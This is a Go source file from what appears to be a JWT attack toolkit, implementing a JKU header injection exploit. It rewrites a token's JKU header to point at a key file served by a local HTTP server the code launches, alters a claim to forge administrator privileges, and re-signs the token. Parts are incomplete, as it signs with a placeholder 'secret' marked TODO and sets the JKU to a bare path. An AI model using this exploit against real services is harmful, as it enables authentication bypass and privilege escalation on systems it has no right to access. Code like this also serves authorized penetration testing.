package attacks

import (
	"JWTechniques/ctrl"
	"fmt"
	"net/http"
	"strconv"

	"github.com/golang-jwt/jwt/v5"
)

const (
	pathToJWKFile string = "/files/jwk.json"
)

func LaunchServer(port int) {

	fmt.Printf("The server is being launched on port %d\n", port)

	//Serve files from the "./files" directory
	fs := http.FileServer(http.Dir("./files"))
	http.Handle("/", fs)

	http.ListenAndServe(":"+strconv.Itoa(port), nil)
}

func ExploitJKU(token *jwt.Token, userHeader string, userValue string) string {

	//Change the value of the "JKU" header to set the path to our file containing our private key
	newToken, err := ctrl.ChangeValue(token, "JKU", pathToJWKFile, true)
	if err != nil {
		fmt.Printf("An error ocurred while modifying the value of \"JWK\" header : %s \n", err)
		return ""
	}

	//Change the value of the header to create the admin privs token
	newToken, err = ctrl.ChangeValue(newToken, userHeader, userValue, false)
	if err != nil {
		fmt.Printf("An error ocurred while modifying the value of the \"%s\" header : %v \n", userHeader, err)
		return ""
	}

	//Sign the token with our private key
	newJWT := ctrl.SignJWT(newToken, []byte("secret")) //TODO : change secret with correct value

	//Launch the server that will serve the jwk file
	go func() {
		LaunchServer(12345)
	}()

	return newJWT

}
